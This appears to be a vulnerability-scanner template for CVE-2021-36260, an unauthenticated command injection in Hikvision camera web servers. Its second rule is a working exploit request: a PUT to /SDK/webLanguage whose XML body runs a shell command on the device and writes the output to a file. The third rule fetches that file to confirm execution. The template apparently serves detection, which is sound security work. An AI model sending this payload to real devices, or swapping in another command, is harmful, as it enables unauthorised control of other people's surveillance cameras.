name: Hikvision_Unauthenticated_RCE_CVE-2021-36260
transport: http
set: {}
detail:
  dock: app="Hikvision-Cameras-and-Surveillance"
  product: Hikvision
  homepage: https://www.hikvision.com/
  impact: A command injection vulnerability in the web server of some Hikvision product.
    Due to the insufficient input validation, attacker can exploit the vulnerability
    to launch a command injection attack by sending some messages with malicious commands.
  description: Hikvision is a world leading IoT solution provider with video as its
    core competency.
rules:
  r1:
    method: GET
    path: /
    follow_redirects: false
    expression: response.status == 200
  r2:
    method: PUT
    path: /SDK/webLanguage
    follow_redirects: false
    headers:
      X-Requested-With: XMLHttpRequest
      Content-Type: application/x-www-form-urlencoded; charset=UTF-8
    body: "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n<language>$(ls -l >webLib/c)</language>"
    expression: response.status == 500
  r3:
    method: GET
    path: /c
    follow_redirects: false
    expression: response.status == 200
expression: r1() && r2() && r3()
